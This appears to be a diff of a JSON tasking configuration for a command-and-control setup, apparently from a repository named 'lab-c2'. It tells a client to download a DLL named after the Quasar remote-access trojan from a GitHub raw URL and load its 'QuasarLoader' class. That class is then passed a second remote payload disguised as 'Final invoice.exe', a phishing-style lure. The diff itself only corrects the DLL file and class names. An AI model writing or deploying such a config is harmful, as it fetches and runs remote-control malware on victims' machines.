@@ -3,11 +3,10 @@
   "tasks": [
     {
       "action": "run_dll",
-      "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/main/QuasarLoader.dll",
-      "class": "Quasar64.dll",
+      "url": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/main/Quasar64.dll",
+      "class": "QuasarLoader",
       "method": "Load",
       "args": "https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/main/Final%20invoice.exe"
     }
   ]
 }
-
